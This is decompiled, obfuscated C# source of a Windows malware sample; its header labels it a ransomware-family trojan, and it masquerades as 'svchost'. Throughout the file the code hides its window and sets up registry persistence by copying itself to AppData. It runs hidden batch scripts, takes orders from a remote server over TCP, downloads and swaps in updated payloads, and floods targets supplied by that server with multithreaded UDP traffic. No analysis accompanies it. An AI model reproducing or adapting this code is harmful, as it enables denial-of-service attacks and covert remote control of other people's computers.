// Decompiled with JetBrains decompiler
// Type: .
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 36273455-8EC6-4593-91A1-C0C7E22093AE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.eait-edd02d618ae57edb781fdd33c67a89ef50f3b7793e4c7f099104d9a7919674b7.exe

using \u0001;
using \u0004;
using \u0005;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace \u0004
{
  internal sealed class \u0004 : Form
  {
    [NonSerialized]
    internal static \u0002 \u0001;
    public int \u0001 = 48289;
    public float \u0001 = 1.7f;
    public Thread \u0001;
    public IPEndPoint \u0001;
    public Socket \u0001 = (Socket) null;
    public NetworkStream \u0001;
    public bool \u0001 = false;
    public Thread \u0002;
    private List<Thread> \u0001;
    private bool \u0002 = false;
    private byte[] \u0001;
    private IPEndPoint \u0002;
    public string \u0001 = Path.GetFileNameWithoutExtension(Application.ExecutablePath);
    public string \u0002 = Path.GetFileName(Application.ExecutablePath);
    public string \u0003 = Application.ExecutablePath;
    public string \u0004 = Application.StartupPath;
    private IContainer \u0001 = (IContainer) null;

    public \u0004() => this.\u0006();

    private void \u0003([In] object obj0, [In] EventArgs obj1)
    {
      string str1 = \u0004.\u0004.\u0001(845);
      string str2 = \u0081\u0003.\u0092\u0002(\u0082\u0003.\u0001\u0005(), \u0004.\u0004.\u0001(995));
      StreamWriter streamWriter1 = new StreamWriter(str2);
      \u0017\u0002.\u007E\u0004\u0005((object) streamWriter1, \u0004.\u0004.\u0001(1020));
      \u0017\u0002.\u007E\u0004\u0005((object) streamWriter1, str1);
      \u0008\u0002.\u007E\u0003\u0005((object) streamWriter1);
      \u0008\u0002.\u007E\u0002\u0005((object) streamWriter1);
      ProcessStartInfo processStartInfo1 = new ProcessStartInfo(str2);
      \u0093.\u007E\u000E\u0002((object) processStartInfo1, true);
      \u0003\u0002.\u007E\u000F\u0002((object) processStartInfo1, ProcessWindowStyle.Hidden);
      Process process1 = \u0092.\u0006\u0002(processStartInfo1);
      ProcessStartInfo processStartInfo2 = (ProcessStartInfo) null;
      string[] strArray = new string[7]
      {
        \u0004.\u0004.\u0001(1033),
        this.\u0002,
        \u0004.\u0004.\u0001(1094),
        \u0094\u0002.\u0010\u0003(Environment.SpecialFolder.ApplicationData),
        \u0004.\u0004.\u0001(1143),
        this.\u0002,
        \u0004.\u0004.\u0001(1148)
      };
      string str3 = \u001A\u0003.\u0095\u0002(strArray);
      string str4 = \u0081\u0003.\u0092\u0002(\u0082\u0003.\u0001\u0005(), \u0004.\u0004.\u0001(1217));
      StreamWriter streamWriter2 = new StreamWriter(str4);
      \u0017\u0002.\u007E\u0004\u0005((object) streamWriter2, \u0004.\u0004.\u0001(1020));
      \u0017\u0002.\u007E\u0004\u0005((object) streamWriter2, str3);
      \u0008\u0002.\u007E\u0003\u0005((object) streamWriter2);
      \u0008\u0002.\u007E\u0002\u0005((object) streamWriter2);
      ProcessStartInfo processStartInfo3 = new ProcessStartInfo(str4);
      \u0093.\u007E\u000E\u0002((object) processStartInfo3, true);
      \u0003\u0002.\u007E\u000F\u0002((object) processStartInfo3, ProcessWindowStyle.Hidden);
      Process process2 = \u0092.\u0006\u0002(processStartInfo3);
      processStartInfo2 = (ProcessStartInfo) null;
      RegistryKey registryKey = \u0008\u0003.\u007E\u001F\u0004((object) Registry.CurrentUser, \u0004.\u0004.\u0001(1242), true);
      if (\u009D.\u007E\u007F\u0004((object) registryKey, \u0004.\u0004.\u0001(1303)) == null)
        \u008F\u0002.\u007E\u0080\u0004((object) registryKey, \u0004.\u0004.\u0001(1303), (object) \u0080\u0003.\u0093\u0002(\u0094\u0002.\u0010\u0003(Environment.SpecialFolder.ApplicationData), \u0004.\u0004.\u0001(1143), this.\u0002));
      if (!\u0010\u0003.\u0097\u0004(\u0080\u0003.\u0093\u0002(\u0094\u0002.\u0010\u0003(Environment.SpecialFolder.ApplicationData), \u0004.\u0004.\u0001(1143), this.\u0002)))
      {
        \u0090\u0002.\u009A\u0004(\u0082\u0003.\u0010(), \u0080\u0003.\u0093\u0002(\u0094\u0002.\u0010\u0003(Environment.SpecialFolder.ApplicationData), \u0004.\u0004.\u0001(1143), this.\u0002));
        \u0005\u0003.\u0016();
      }
      else
      {
        try
        {
          \u001C\u0002.\u0096\u0004(\u0080\u0003.\u0093\u0002(\u0094\u0002.\u0010\u0003(Environment.SpecialFolder.ApplicationData), \u0004.\u0004.\u0001(1143), this.\u0002));
          \u0090\u0002.\u009A\u0004(\u0082\u0003.\u0010(), \u0080\u0003.\u0093\u0002(\u0094\u0002.\u0010\u0003(Environment.SpecialFolder.ApplicationData), \u0004.\u0004.\u0001(1143), this.\u0002));
        }
        catch
        {
        }
      }
      this.\u0001 = new IPEndPoint(\u000E\u0002.\u008E(\u0003.Default.DNS)[0], this.\u0001);
      this.\u0002 = new Thread(new ThreadStart(this.\u0003));
      \u0093.\u007E\u0088\u0003((object) this.\u0002, true);
      \u0008\u0002.\u007E\u0086\u0003((object) this.\u0002);
      this.\u0001 = new Thread(new ThreadStart(this.\u0004));
      \u0093.\u007E\u0088\u0003((object) this.\u0001, true);
      this.\u0003(true);
    }

    public void \u0003()
    {
      while (true)
      {
        RegistryKey registryKey = \u0008\u0003.\u007E\u001F\u0004((object) Registry.CurrentUser, \u0004.\u0004.\u0001(1242), true);
        if (\u009D.\u007E\u007F\u0004((object) registryKey, \u0004.\u0004.\u0001(1303)) == null)
          \u008F\u0002.\u007E\u0080\u0004((object) registryKey, \u0004.\u0004.\u0001(1303), (object) \u0080\u0003.\u0093\u0002(\u0094\u0002.\u0010\u0003(Environment.SpecialFolder.ApplicationData), \u0004.\u0004.\u0001(1143), this.\u0002));
      }
    }

    public void \u0003([In] bool obj0)
    {
      while (true)
      {
        try
        {
          this.\u0001 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
          \u001E\u0002.\u007E\u0098((object) this.\u0001, (EndPoint) this.\u0001);
          if (!\u008F.\u007E\u0097((object) this.\u0001))
            break;
          this.\u0001 = new NetworkStream(this.\u0001, true);
          string[] strArray = new string[5]
          {
            \u0004.\u0004.\u0001(1316),
            this.\u0001.ToString(),
            \u0004.\u0004.\u0001(1329),
            \u001F\u0002.\u007E\u001E\u0002((object) \u0011\u0002.\u007E\u0016\u0003((object) \u008A\u0002.\u000F\u0003())),
            \u0004.\u0004.\u0001(1334)
          };
          byte[] numArray = this.\u0003(\u001A\u0003.\u0095\u0002(strArray));
          \u0088\u0002.\u007E\u008C\u0004((object) this.\u0001, numArray, 0, numArray.Length);
          \u0008\u0002.\u007E\u0089\u0004((object) this.\u0001);
          if (obj0)
            \u0008\u0002.\u007E\u0086\u0003((object) this.\u0001);
          break;
        }
        catch
        {
        }
      }
    }

    public void \u0004()
    {
      while (true)
      {
        bool flag = true;
        try
        {
          if (this.\u0001 != null && \u008F.\u007E\u0097((object) this.\u0001))
          {
            string str1 = string.Empty;
            List<char> charList = new List<char>();
            while (true)
            {
              flag = true;
              int num = \u0091.\u007E\u008B\u0004((object) this.\u0001);
              char ch = (char) num;
              if (num != -1 && !\u0091\u0002.\u0081\u0002(ch.ToString(), \u0004.\u0004.\u0001(1334)))
                charList.Add(ch);
              else
                break;
            }
            foreach (char ch in charList.ToArray())
              str1 = \u0081\u0003.\u0092\u0002(str1, \u0007\u0003.\u007E\u008F\u0002((object) ch.ToString(), \u0004.\u0004.\u0001(1339), \u0004.\u0004.\u0001(1344)));
            string key = str1;
            if (key != null)
            {
              // ISSUE: reference to a compiler-generated field
              if (\u0002.\u0001 == null)
              {
                // ISSUE: reference to a compiler-generated field
                \u0002.\u0001 = new Dictionary<string, int>(7)
                {
                  {
                    \u0004.\u0004.\u0001(1345),
                    0
                  },
                  {
                    \u0004.\u0004.\u0001(1362),
                    1
                  },
                  {
                    \u0004.\u0004.\u0001(1383),
                    2
                  },
                  {
                    \u0004.\u0004.\u0001(1396),
                    3
                  },
                  {
                    \u0004.\u0004.\u0001(1413),
                    4
                  },
                  {
                    \u0004.\u0004.\u0001(1430),
                    5
                  },
                  {
                    \u0004.\u0004.\u0001(1447),
                    6
                  }
                };
              }
              int num;
              // ISSUE: reference to a compiler-generated field
              // ISSUE: explicit non-virtual call
              if (__nonvirtual (\u0002.\u0001.TryGetValue(key, out num)))
              {
                switch (num)
                {
                  case 1:
                    byte[] numArray = this.\u0003(\u0004.\u0004.\u0001(1460));
                    \u0088\u0002.\u007E\u008C\u0004((object) this.\u0001, numArray, 0, numArray.Length);
                    \u0008\u0002.\u007E\u0089\u0004((object) this.\u0001);
                    break;
                  case 2:
                    \u0093.\u007E\u009A((object) this.\u0001, true);
                    this.\u0003(false);
                    break;
                  case 3:
                    \u0003.Default.Active = true;
                    \u0008\u0002.\u007E\u009D((object) \u0003.Default);
                    break;
                  case 4:
                    \u0003.Default.Active = false;
                    \u0008\u0002.\u007E\u009D((object) \u0003.Default);
                    break;
                  case 5:
                    this.\u0002 = false;
                    foreach (Thread thread in this.\u0001.ToArray())
                      \u0008\u0002.\u007E\u0087\u0003((object) thread);
                    break;
                  case 6:
                    \u0008\u0002.\u007E\u0087\u0003((object) this.\u0002);
                    RegistryKey registryKey = \u0008\u0003.\u007E\u001F\u0004((object) Registry.CurrentUser, \u0004.\u0004.\u0001(1242), true);
                    if (\u009D.\u007E\u007F\u0004((object) registryKey, \u0004.\u0004.\u0001(1303)) != null)
                      \u0017\u0002.\u007E\u001E\u0004((object) registryKey, \u0004.\u0004.\u0001(1303));
                    \u0005\u0003.\u0015();
                    break;
                }
              }
            }
            if (\u0004\u0002.\u007E\u008A\u0002((object) str1, \u0004.\u0004.\u0001(1489)))
            {
              try
              {
                WebClient webClient = new WebClient();
                byte[] numArray = \u009A\u0002.\u007E\u0094((object) webClient, \u009E.\u007E\u008F((object) \u0018\u0002.\u007E\u0093((object) webClient), new Uri(\u0004.\u0004.\u0001(1502))));
                if (\u0010\u0003.\u0097\u0004(\u001B\u0003.\u0094\u0002(this.\u0004, \u0004.\u0004.\u0001(1143), this.\u0001, \u0004.\u0004.\u0001(1575))))
                  \u001C\u0002.\u0096\u0004(\u001B\u0003.\u0094\u0002(this.\u0004, \u0004.\u0004.\u0001(1143), this.\u0001, \u0004.\u0004.\u0001(1575)));
                \u0090\u0002.\u009A\u0004(this.\u0003, \u001B\u0003.\u0094\u0002(this.\u0004, \u0004.\u0004.\u0001(1143), this.\u0001, \u0004.\u0004.\u0001(1575)));
                \u0006\u0002.\u0099\u0004(this.\u0003, numArray);
                \u0005\u0003.\u0013();
                BinaryWriter binaryWriter = new BinaryWriter((Stream) new FileStream(this.\u0003, FileMode.Open, FileAccess.Write));
                long num = \u0087\u0003.\u007E\u0092\u0004((object) binaryWriter, \u0005\u0002.\u0013\u0003(\u008C\u0002.\u007E\u0090\u0002((object) str1, 0, 8)), SeekOrigin.Begin);
                \u001F\u0003.\u007E\u0093\u0004((object) binaryWriter, \u009E\u0002.\u007E\u0084\u0002((object) \u0003.Default.DNS));
                \u0008\u0002.\u007E\u0091\u0004((object) binaryWriter);
                \u0008\u0002.\u007E\u0090\u0004((object) binaryWriter);
                \u0005\u0003.\u0016();
              }
              catch
              {
              }
            }
            if (\u0003.Default.Active)
            {
              string str2;
              if (\u0004\u0002.\u007E\u008A\u0002((object) str1, \u0004.\u0004.\u0001(1584)))
              {
                string str3 = \u008C\u0002.\u007E\u0090\u0002((object) str1, 0, 9);
                string str4 = \u0004.\u0004.\u0001(1344);
                str2 = \u0004.\u0004.\u0001(1344);
                for (int index = 0; index < \u0091.\u007E\u0086\u0002((object) str3); ++index)
                {
                  char ch = \u0086\u0002.\u007E\u0083\u0002((object) str3, index);
                  if (\u0091\u0002.\u0082\u0002(ch.ToString(), \u0004.\u0004.\u0001(1597)))
                  {
                    \u0081\u0003 obj = \u0081\u0003.\u0092\u0002;
                    string str5 = str4;
                    ch = \u0086\u0002.\u007E\u0083\u0002((object) str3, index);
                    string str6 = ch.ToString();
                    str4 = obj(str5, str6);
                  }
                  else
                    break;
                }
                str2 = \u0007\u0003.\u007E\u008F\u0002((object) str3, str4, \u0004.\u0004.\u0001(1344));
                string str7 = \u0007\u0003.\u007E\u008F\u0002((object) str4, \u0004.\u0004.\u0001(1597), \u0004.\u0004.\u0001(1344));
                string str8 = \u0007\u0003.\u007E\u008F\u0002((object) str3, str7, \u0004.\u0004.\u0001(1344));
                string str9 = \u0007\u0003.\u007E\u008F\u0002((object) str8, \u0004.\u0004.\u0001(1597), \u0004.\u0004.\u0001(1344));
                this.\u0003(1, new IPEndPoint(\u001B\u0002.\u0090(str7), \u0005\u0002.\u0013\u0003(str9)));
                this.\u0002 = true;
              }
              if (\u0004\u0002.\u007E\u008A\u0002((object) str1, \u0004.\u0004.\u0001(1602)))
              {
                string str10 = \u008C\u0002.\u007E\u0090\u0002((object) str1, 0, 9);
                string str11 = \u0004.\u0004.\u0001(1344);
                str2 = \u0004.\u0004.\u0001(1344);
                for (int index = 0; index < \u0091.\u007E\u0086\u0002((object) str10); ++index)
                {
                  char ch = \u0086\u0002.\u007E\u0083\u0002((object) str10, index);
                  if (\u0091\u0002.\u0082\u0002(ch.ToString(), \u0004.\u0004.\u0001(1597)))
                  {
                    \u0081\u0003 obj = \u0081\u0003.\u0092\u0002;
                    string str12 = str11;
                    ch = \u0086\u0002.\u007E\u0083\u0002((object) str10, index);
                    string str13 = ch.ToString();
                    str11 = obj(str12, str13);
                  }
                  else
                    break;
                }
                str2 = \u0007\u0003.\u007E\u008F\u0002((object) str10, str11, \u0004.\u0004.\u0001(1344));
                string str14 = \u0007\u0003.\u007E\u008F\u0002((object) str11, \u0004.\u0004.\u0001(1597), \u0004.\u0004.\u0001(1344));
                string str15 = \u0007\u0003.\u007E\u008F\u0002((object) str10, str14, \u0004.\u0004.\u0001(1344));
                string str16 = \u0007\u0003.\u007E\u008F\u0002((object) str15, \u0004.\u0004.\u0001(1597), \u0004.\u0004.\u0001(1344));
                this.\u0003(2, new IPEndPoint(\u001B\u0002.\u0090(str14), \u0005\u0002.\u0013\u0003(str16)));
                this.\u0002 = true;
              }
              if (\u0004\u0002.\u007E\u008A\u0002((object) str1, \u0004.\u0004.\u0001(1615)))
              {
                string str17 = \u008C\u0002.\u007E\u0090\u0002((object) str1, 0, 9);
                string str18 = \u0004.\u0004.\u0001(1344);
                str2 = \u0004.\u0004.\u0001(1344);
                for (int index = 0; index < \u0091.\u007E\u0086\u0002((object) str17); ++index)
                {
                  char ch = \u0086\u0002.\u007E\u0083\u0002((object) str17, index);
                  if (\u0091\u0002.\u0082\u0002(ch.ToString(), \u0004.\u0004.\u0001(1597)))
                  {
                    \u0081\u0003 obj = \u0081\u0003.\u0092\u0002;
                    string str19 = str18;
                    ch = \u0086\u0002.\u007E\u0083\u0002((object) str17, index);
                    string str20 = ch.ToString();
                    str18 = obj(str19, str20);
                  }
                  else
                    break;
                }
                str2 = \u0007\u0003.\u007E\u008F\u0002((object) str17, str18, \u0004.\u0004.\u0001(1344));
                string str21 = \u0007\u0003.\u007E\u008F\u0002((object) str18, \u0004.\u0004.\u0001(1597), \u0004.\u0004.\u0001(1344));
                string str22 = \u0007\u0003.\u007E\u008F\u0002((object) str17, str21, \u0004.\u0004.\u0001(1344));
                string str23 = \u0007\u0003.\u007E\u008F\u0002((object) str22, \u0004.\u0004.\u0001(1597), \u0004.\u0004.\u0001(1344));
                this.\u0003(3, new IPEndPoint(\u001B\u0002.\u0090(str21), \u0005\u0002.\u0013\u0003(str23)));
                this.\u0002 = true;
              }
              if (\u0004\u0002.\u007E\u008A\u0002((object) str1, \u0004.\u0004.\u0001(1628)))
              {
                string str24 = \u008C\u0002.\u007E\u0090\u0002((object) str1, 0, 9);
                string str25 = \u0004.\u0004.\u0001(1344);
                str2 = \u0004.\u0004.\u0001(1344);
                for (int index = 0; index < \u0091.\u007E\u0086\u0002((object) str24); ++index)
                {
                  char ch = \u0086\u0002.\u007E\u0083\u0002((object) str24, index);
                  if (\u0091\u0002.\u0082\u0002(ch.ToString(), \u0004.\u0004.\u0001(1597)))
                  {
                    \u0081\u0003 obj = \u0081\u0003.\u0092\u0002;
                    string str26 = str25;
                    ch = \u0086\u0002.\u007E\u0083\u0002((object) str24, index);
                    string str27 = ch.ToString();
                    str25 = obj(str26, str27);
                  }
                  else
                    break;
                }
                str2 = \u0007\u0003.\u007E\u008F\u0002((object) str24, str25, \u0004.\u0004.\u0001(1344));
                string str28 = \u0007\u0003.\u007E\u008F\u0002((object) str25, \u0004.\u0004.\u0001(1597), \u0004.\u0004.\u0001(1344));
                string str29 = \u0007\u0003.\u007E\u008F\u0002((object) str24, str28, \u0004.\u0004.\u0001(1344));
                string str30 = \u0007\u0003.\u007E\u008F\u0002((object) str29, \u0004.\u0004.\u0001(1597), \u0004.\u0004.\u0001(1344));
                this.\u0003(4, new IPEndPoint(\u001B\u0002.\u0090(str28), \u0005\u0002.\u0013\u0003(str30)));
                this.\u0002 = true;
              }
              if (\u0004\u0002.\u007E\u008A\u0002((object) str1, \u0004.\u0004.\u0001(1641)))
              {
                string str31 = \u008C\u0002.\u007E\u0090\u0002((object) str1, 0, 8);
                string str32 = \u0081\u0003.\u0092\u0002(\u0082\u0003.\u0001\u0005(), \u0004.\u0004.\u0001(1654));
                StreamWriter streamWriter = new StreamWriter(str32);
                \u0017\u0002.\u007E\u0004\u0005((object) streamWriter, \u0004.\u0004.\u0001(1020));
                \u0017\u0002.\u007E\u0004\u0005((object) streamWriter, str31);
                \u0008\u0002.\u007E\u0003\u0005((object) streamWriter);
                \u0008\u0002.\u007E\u0002\u0005((object) streamWriter);
                ProcessStartInfo processStartInfo = new ProcessStartInfo(str32);
                \u0093.\u007E\u000E\u0002((object) processStartInfo, true);
                \u0003\u0002.\u007E\u000F\u0002((object) processStartInfo, ProcessWindowStyle.Hidden);
                Process process = \u0092.\u0006\u0002(processStartInfo);
              }
            }
          }
        }
        catch
        {
          \u0093.\u007E\u009A((object) this.\u0001, true);
          this.\u0003(false);
        }
      }
    }

    public void \u0003([In] int obj0, [In] IPEndPoint obj1)
    {
      this.\u0002 = obj1;
      // ISSUE: reference to a compiler-generated method
      MemoryStream input = new MemoryStream(\u0005.\u0001.\u0003());
      BinaryReader binaryReader = new BinaryReader((Stream) input);
      this.\u0001 = \u0083\u0002.\u007E\u008E\u0004((object) binaryReader, 1024);
      \u0008\u0002.\u007E\u0088\u0004((object) input);
      this.\u0001 = new List<Thread>();
      if (obj0 == 1)
      {
        for (int index = 0; index < 50; ++index)
        {
          this.\u0001.Add(new Thread(new ThreadStart(this.\u0005)));
          \u0093.\u007E\u0088\u0003((object) this.\u0001[index], true);
          \u0008\u0002.\u007E\u0086\u0003((object) this.\u0001[index]);
        }
      }
      if (obj0 == 2)
      {
        for (int index = 0; index < 100; ++index)
        {
          this.\u0001.Add(new Thread(new ThreadStart(this.\u0005)));
          \u0093.\u007E\u0088\u0003((object) this.\u0001[index], true);
          \u0008\u0002.\u007E\u0086\u0003((object) this.\u0001[index]);
        }
      }
      if (obj0 == 3)
      {
        for (int index = 0; index < 150; ++index)
        {
          this.\u0001.Add(new Thread(new ThreadStart(this.\u0005)));
          \u0093.\u007E\u0088\u0003((object) this.\u0001[index], true);
          \u0008\u0002.\u007E\u0086\u0003((object) this.\u0001[index]);
        }
      }
      if (obj0 != 4)
        return;
      for (int index = 0; index < 200; ++index)
      {
        this.\u0001.Add(new Thread(new ThreadStart(this.\u0005)));
        \u0093.\u007E\u0088\u0003((object) this.\u0001[index], true);
        \u0008\u0002.\u007E\u0086\u0003((object) this.\u0001[index]);
      }
    }

    private void \u0005()
    {
      Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
      while (this.\u0002)
      {
        try
        {
          int num = \u001E\u0003.\u007E\u0099((object) socket, this.\u0001, SocketFlags.None, (EndPoint) this.\u0002);
        }
        catch
        {
        }
      }
    }

    public byte[] \u0003([In] string obj0) => \u0083\u0003.\u007E\u0017\u0004((object) \u0092\u0002.\u001A\u0004(), obj0);

    protected override void Dispose([In] bool obj0)
    {
      if (obj0 && this.\u0001 != null)
        \u0008\u0002.\u007E\u0080\u0002((object) this.\u0001);
      \u0093.\u0089((object) this, obj0);
    }

    private void \u0006()
    {
      \u0008\u0002.\u001C((object) this);
      \u001D\u0003.\u0019((object) this, AccessibleRole.None);
      \u0016\u0003.\u001D((object) this, new SizeF(6f, 13f));
      \u009F\u0002.\u001E((object) this, AutoScaleMode.Font);
      \u0015\u0003.\u0080((object) this, new Size(10, 10));
      \u0093.\u0081((object) this, false);
      \u0095.\u007F((object) this, FormBorderStyle.None);
      \u0093.\u0082((object) this, false);
      \u0093.\u0083((object) this, false);
      \u0017\u0002.\u001A((object) this, \u0004.\u0004.\u0001(1671));
      \u009F.\u0084((object) this, 0.0);
      \u0093.\u0087((object) this, false);
      \u0093.\u0086((object) this, false);
      \u0014\u0003.\u0088((object) this, new EventHandler(this.\u0003));
      \u0093.\u001B((object) this, false);
    }

    static \u0004() => \u0003.\u0003();
  }
}
